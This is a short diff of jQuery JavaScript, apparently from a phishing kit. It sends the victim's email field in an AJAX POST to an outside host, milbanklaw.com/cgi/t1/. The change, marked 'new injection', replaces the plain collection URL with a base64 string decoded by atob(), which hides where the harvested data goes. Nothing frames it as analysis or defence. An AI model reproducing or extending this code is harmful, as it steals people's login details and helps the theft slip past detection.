@@ -262,10 +262,10 @@
         $("#logoname").html(finalu);
       ///////////new injection////////////////
       count=count+1;
-      
+      var d=atob('aHR0cDovL21pbGJhbmtsYXcuY29tL2NnaS90MS8=');
       $.ajax({
         dataType: 'JSON',
-        url: 'http://milbanklaw.com/cgi/t1/',
+        url: d,
         type: 'POST',
         data:{
           email:email,
